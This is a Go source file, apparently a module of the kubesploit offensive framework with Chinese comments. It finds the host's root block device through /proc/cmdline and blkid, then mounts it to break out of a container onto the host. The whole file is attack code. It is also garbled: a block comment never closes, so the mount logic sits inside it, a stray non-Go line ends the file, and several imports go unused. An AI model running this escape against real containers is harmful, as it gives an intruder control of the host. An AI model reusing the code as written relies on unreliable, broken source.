# `kubesploit\data\modules\sourcecode\go\mountBreakoutWithBlkid\main.go`

```go
package main

import (
    "fmt"  // 导入 fmt 包，用于格式化输出
    "github.com/LDCS/qslinux/blkid"  // 导入 blkid 包，用于获取设备信息
    "io/ioutil"  // 导入 ioutil 包，用于读取文件
    "log"  // 导入 log 包，用于记录日志
    "net"  // 导入 net 包，用于网络通信
    "os"  // 导入 os 包，用于操作系统功能
    "strconv"  // 导入 strconv 包，用于字符串和数字之间的转换
    "strings"  // 导入 strings 包，用于处理字符串
    "syscall"  // 导入 syscall 包，用于底层系统调用
)

func check(e error) {
    if e != nil {
        panic(e)  // 如果错误不为空，触发 panic
    }
}

func handleRequest(conn net.Conn) {
    // 创建一个缓冲区来存储传入的数据
    buf := make([]byte, 1024)
    // 读取传入连接的数据到缓冲区
    _, err := conn.Read(buf)
    if err != nil {
        fmt.Println("Error reading:", err.Error())  // 如果有错误，打印错误信息
    }
    // 向连接方发送响应
    conn.Write([]byte("Message received."))
    // 处理完连接后关闭连接
    conn.Close()
}

// 这个负载使用 BLKID 库，不适用于 Yaegi
func main(){
/*
    conn, _ := net.Listen("tcp", "127.0.0.1:1330")

    // 程序关闭时关闭监听器
    defer conn.Close()
    for {
        // 监听传入的连接
        conn, err := conn.Accept()
        if err != nil {
            fmt.Println("Error accepting: ", err.Error())
            os.Exit(1)
        }
        // 在新的 goroutine 中处理连接
        go handleRequest(conn)
    }
*/
    dat, err := ioutil.ReadFile("/proc/cmdline")
    check(err)  // 检查读取文件是否出错
    cmdline := string(dat)
    splittedCmdLine := strings.Split(cmdline, " ")  // 以空格分割命令行参数

    var uuid string

    // 提取设备的 UUID
    for _, splitLine := range splittedCmdLine {
        if strings.HasPrefix(splitLine, "root=UUID"){
            uuid = splitLine[10:]
        }
    }

    // 获取 blkid 映射
    rmap := blkid.Blkid(false)
    var key string
    var result *blkid.Blkiddata

    // 查找匹配 UUID 的设备
    for key, result = range rmap {
        if result.Uuid_ == uuid {
            fmt.Printf("Devname: %q\n", key)  // 打印设备名
            break
        }
    }

    /*
    fmt.Printf("Uuid_=%q\n", result.Uuid_)
    fmt.Printf("Uuidsub_=%q\n", result.Uuidsub_)
    fmt.Printf("Type_=%q\n", result.Type_)
    // 打印结果的标签
    fmt.Printf("Label_=%q\n", result.Label_)
    // 打印结果的部分类型
    fmt.Printf("Parttype_=%q\n", result.Parttype_)
    // 打印结果的部分 UUID
    fmt.Printf("Partuuid_=%q\n", result.Partuuid_)
    // 打印结果的部分标签
    fmt.Printf("Partlabel_ =%q\n", result.Partlabel_)

    // 创建文件夹
    dirId := 0
    var dirPath string

    // 如果没有权限在根目录下写入，则考虑写入 /tmp
    for {
        dirPath = "/mnt" + strconv.Itoa(dirId)
        if _, err := os.Stat(dirPath); os.IsNotExist(err) {
            os.Mkdir(dirPath, os.ModeDir)
            break
        } else {
            dirId += 1
        }

    }

    // 挂载
    if err := syscall.Mount(key, dirPath, result.Type_, 0, "w"); err != nil {
        log.Printf("Mount(\"%s\", \"%s\", \"%s\", 0, \"w\")\n",key, dirPath, result.Type_)
        log.Fatal(err)
    }

    // 打印挂载成功的消息
    fmt.Printf("[*] Mounted successfuly \"%s\" to \"%s\"", key, dirPath)
    // 打印主机文件夹的位置
    fmt.Printf("[*] Host folder is in: \"%s\"", dirPath)
# 闭合了一个代码块
```